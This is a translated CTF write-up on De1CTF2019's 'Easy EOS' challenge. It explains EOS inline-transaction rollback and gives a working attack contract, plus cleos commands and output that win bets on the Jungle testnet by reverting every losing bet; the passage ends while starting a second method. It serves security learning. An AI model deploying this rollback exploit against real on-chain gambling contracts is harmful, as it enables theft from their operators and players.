# Easy EOS from De1CTF2019（2）
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 回顾一下，上一篇我们对题目进行了简单介绍，并就基于逆向的随机数攻击进行了阐述；这一次，我们将入门最基础的交易回滚攻击，也即 Rollback
> attack。如果说 fallback 攻击是以太坊中最具代表性的，那 rollback 攻击则应该是 EOS 中的亮点
基础的方面，我还是先建议阅读
  * EOS的[通信模型](https://developers.eos.io/eosio-nodeos/docs/communication-model)
  * 交易[回滚漏洞简析](%E6%BC%8F%E6%B4%9E%E7%AE%80%E6%9E%90)
有了铺垫，我们开始就题目而言进行介绍
## Rollback attack
怎么在不知道准确bet值的时候赢下10场？上一次介绍可以通过[破译随机数](https://www.anquanke.com/post/id/183848)，但这个方式显然不够优雅，况且
wasm 的逆向确实过于麻烦了，那有没有其他的思路呢？试想一下，如果我们瞎猜，但是每次让失败的次数都“回滚”，那就可以了吧！
如果屏幕前的你之前做过以太坊类型的题目，应该会熟悉“内部交易”即 [Internal
Transactions](//dewone.zendesk.com/hc/zh-cn/articles/360005205873-Transactions-%E5%92%8CInternal-Transactions%E7%9A%84%E5%8C%BA%E5%88%AB))，在进行 fallback
攻击时一定会有产生大量的内部交易，而且由于内部交易的数据多数时候无法由区块链浏览器进行跟踪，总是可以隐藏一些行踪。
我们由下图理解以太坊中的内部交易
这个情况下，合约充当一个中介(proxy)的作用，由这个中介继续进行发布的交易均为内部交易；但是对于EOS而言
合约的通信可以进一步划分为内联(inline)以及延迟(deffered)，简单的来说，以太坊中的内部交易应该是EOS内联交易的子集，而延迟交易添加了时延的功能并可以主动地撤销；不同的则是，EOS中的内联交易遵守严格的回滚机制，官方的介绍如下:
> If any part of the transaction fails, the inline actions will unwind with
> the rest of the transaction.
这也就意味着内联交易链条上一旦有一环出现了问题，整个交易就会全部回滚，而这正是我们需要的
> 1.6 cdt 以后可以使用 check 来主动的触发错误回滚交易
###  编写攻击代码
我们首先阅读一下官方给出的[攻击代码](https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/misc/Easy%20EOS/attack4/attack4.cpp)
    #include 
    #include 
    #define TARGET_ACCOUNT "de1ctftest11"
    using namespace eosio;
    class [[eosio::contract]] attack4 : public contract {
      private:
        struct [[eosio::table]] user_info {
          name        username;
          uint32_t        win;
          uint32_t        lost;
          auto primary_key() const { return username.value; }
        };
        typedef eosio::multi_index user_info_table;
        user_info_table _users;
      public:
        using contract::contract;
        attack4( name receiver, name code, datastream ds ):contract(receiver, code, ds),
                           _users(eosio::name(TARGET_ACCOUNT), eosio::name(TARGET_ACCOUNT).value) {}
        [[eosio::action]]
        void judge()
        {
          auto user_iterator = _users.find(get_self().value);
          check(user_iterator != _users.end(), "empty.");
          check(user_iterator->lost == 0, "you lost.");
        }
        [[eosio::action]]
        void makebet()
        {
          int random_num = 3;
          action(
            permission_level{get_self(),"active"_n},  //所需要的权限结构
            name(TARGET_ACCOUNT),                          // 调用的合约名称
            "bet"_n,                              // 合约的方法
            std::make_tuple(get_self(), random_num) // 传递的参数
          ).send();
          action(
            permission_level{get_self(),"active"_n},  //所需要的权限结构
            get_self(),                          // 调用的合约名称
            "judge"_n,                              // 合约的方法
            std::make_tuple(get_self()) // 传递的参数
          ).send();
        }
    };
我们对合约关键的部分做一些解释，如果仍有疑惑可以在讨论区留言
首先我们对合约内定义的数据表做了解
    struct [[eosio::table]] user_info {
      name        username;
      uint32_t        win;
      uint32_t        lost;
      auto primary_key() const { return username.value; }
    };
再通过区块链浏览器看看这个表的作用，合约中命名为 [users
表](https://jungle.bloks.io/account/de1ctftest11?loadContract=true&tab=Tables&account=de1ctftest11&scope=de1ctftest11&limit=100&table=users)
这里通过尝试的方法可以获取到这个表记录所有参与用户的游戏状态，其中键值即为参与的用户名，而 win 记录胜利场次同时 lost 记录输的场次；
> 这里笔者在初次应付题目时候有如下疑惑：表的作用容易观察但表内数据结构该如何准确定夺呢？其中名为username的键以合约中专属的 **name**
> 类型这是好确定的，但 **win** 和 **lost** 的 unsigned int32
> 类型这可是不太好猜测的吧？读者如果有什么可以查询表内的数据类型的话请示教
>
> 这里我们就算后知后觉，阅读wp获取到数据的类型（猜测一般情况下题目给出部分合约内容以保证获取表结构，或者再倒霉也许可以通过逆向方式进行
由于题目要求已经给出，再获取10次胜利前我们不得输掉一场，那么，根据前文提到的内联交易的方式，如果目标合约判断用户输入以及开奖是放到一个交易链中的话，我们可以给出如下的攻击思路
  1. 攻击合约，以任意一个赌注 (0 — 4) 发起游戏（当然该例子中固定为3不过没有什么影响）
  2. 在下赌注后，以内联的方式查询目标合约 users 表 
    * 如果 lost 数目为 0 则说明此次下注（运气不错）赢了
    * 如果 lost 数目非 0 则说明此次下注（运气不佳）输了，主动回滚交易，等待下一次攻击
通过这样的方式，我们自然就可以保证不输的情况下完成10次胜利，我们如下进行展示
###  落实回滚攻击
这里我们默认已经注册好了 JUNGLE TESTNET
的账户，没有账户的读者可以前去[官网](https://jungletestnet.io/)注册并导入私钥进入本地的 keosd
钱包，我们首先为自己的合约抵押一定的 RAM 保证可以进行合约部署
    formal1n@malindeMacBook-Air:~ ➜ cleos -u http://jungle2.cryptolions.io:80 system buyram aaatester142 aaatester142 "10.0000 EOS"
    executed transaction: 7c52c650174fc7dc9cab84a23017b8319392e24aa2e1418b04a64a7df6bd5d8a  128 bytes  762 us
    #         eosio  注意命令中 -u 是指定代理的全节点来发布命令（当然如果读者自己有全节点的话就不用这么麻烦了，这毕竟慢，而且还需要科学上网
然后我们将wp给出的合约进行部署，当然编译的过程可以使用本地的 cdt 或者借助一些线上工具如币安的编译器
[https://beosin.com/#/，假设编译得到的](https://beosin.com/#/%EF%BC%8C%E5%81%87%E8%AE%BE%E7%BC%96%E8%AF%91%E5%BE%97%E5%88%B0%E7%9A%84)
abi 和合约 wasm 文件存放在 attack4 文件夹，如下
我们通过如下命令部署
    formal1n@malindeMacBook-Air:attack4 ➜ cleos -u http://jungle2.cryptolions.io:80 set contract aaatester142 .
    Reading WASM from /Users/formal1n/Downloads/blockchain/learn/attack4/attack4.wasm...
    Publishing contract...
    executed transaction: 9735e39d4a45505b06d1ce0f86e7ec1a0f56c05069eb47009065aaa7edcfdb45  3144 bytes  827 us
    #         eosio <= eosio::setcode               {"account":"aaatester142","vmtype":0,"vmversion":0,"code":"0061736d0100000001420c6000006000017f60027...
    #         eosio <= eosio::setabi                {"account":"aaatester142","abi":"0e656f73696f3a3a6162692f312e310003056a756467650000076d616b656265740...
    warn  2019-08-27T14:38:48.505 thread-0  main.cpp:495                  warning: transaction executed locally, but may not be confirmed by the network yet
接下来我们尝试一次下注，不过在之前我们还需要给合约设定 eosio.code 权限，关于该权限不理解的可以去自行搜索，这里我们就当套用
    formal1n@malindeMacBook-Air:attack4 ➜ cleos -u http://jungle2.cryptolions.io:80 set account permission aaatester142 active '{"threshold" : 1, "keys" : [{"key":"EOS5kk3M6AhBLhhCPHvHPZBCb9i2R7GXg4ZQSL3pD7241NZrn3Efc","weight":1}], "accounts" : [{"permission":{"actor":"aaatester142","permission":"eosio.code"},"weight":1}]}' owner -p aaatester142@owner
    executed transaction: b48cb2c71a20636b5201e12de4e7234fccbe533fb1fd5208d0caf9d651050ed9  184 bytes  217 us
    #         eosio <= eosio::updateauth            {"account":"aaatester142","permission":"active","parent":"owner","auth":{"threshold":1,"keys":[{"key...
    warn  2019-08-27T14:40:34.612 thread-0  main.cpp:495                  warning: transaction executed locally, but may not be confirmed by the network yet
好的，万事俱备，我们先试试一次下注
    formal1n@malindeMacBook-Air:attack4 ➜ cleos -u http://jungle2.cryptolions.io:80 push action aaatester142 makebet '{}' -p aaatester142@active
    Error 3050003: eosio_assert_message assertion failure
    Error Details:
    assertion failure with message: you lost.
    pending console output:
看到结果，这一次我们下注是输了，不过交易整个回滚，查看浏览器可以发现并没有输掉的这一次记录，命令台也没有此次交易相关的哈希；
我们多次再尝试，即使我们回滚了交易，但是目标合约内的随机种子是变化的，故我们一定有机会可以下注成功，如尝试第四次时得到
    formal1n@malindeMacBook-Air:attack4 ⍉ ➜ cleos -u http://jungle2.cryptolions.io:80 push action aaatester142 makebet '{}' -p aaatester142@active
    executed transaction: 0f1558b1d65fe9ddb5646f60fe5f8c7ce82df97a836e8e201c8a0147c72caa81  96 bytes  334 us
    #  aaatester142 <= aaatester142::makebet        ""
    #  de1ctftest11 <= de1ctftest11::bet            {"username":"aaatester142","num":3}
    #  aaatester142 <= aaatester142::judge          "2048b82a63958d31"
    warn  2019-08-27T14:44:31.409 thread-0  main.cpp:495                  warning: transaction executed locally, but may not be confirmed by the network yet
自然，细心的读者会发问，如果是回滚，那记录种子的数据表不是也会回滚么？但实际上目标合约的逻辑是每一次根据现有的种子值已经时间戳值更新随机数并以该随机数进行比较，于是，成功的攻击才会更改种子值而且不必担心；（若试想种子的更新值不是依靠时间啥的，那固定一个攻击下注值还是蛮危险的）
###  其他的回滚方法
通过学习，笔者还依葫芦画瓢想到另外一种回滚攻击方法，通过记录 seed 的值和每次下注的值可以发现如下规律
  * 表中现存的 seed 值总是与上一次 (下注值 % 5) 的值相同